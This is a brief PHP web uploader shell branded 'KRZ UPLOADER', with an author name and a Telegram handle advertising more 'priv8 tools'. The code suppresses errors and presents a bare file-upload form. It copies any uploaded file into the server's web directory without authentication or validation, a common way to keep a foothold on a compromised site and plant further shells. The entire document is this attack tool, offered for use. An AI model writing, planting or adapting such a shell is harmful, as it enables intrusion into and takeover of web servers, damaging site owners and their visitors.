<title>KRZ UPLOADER</title>
<center>
<h2>Mohammed Kairz<h2>
  <center>
  <h2>More priv8 tools, Telegram @mohammedkairz<h2>
  <center>
    <br>
<?php
error_reporting(0);
$saw1 = $_FILES['f']['tmp_name'];
$saw2 = $_FILES['f']['name'];
echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>";
@copy($saw1,$saw2);
?>
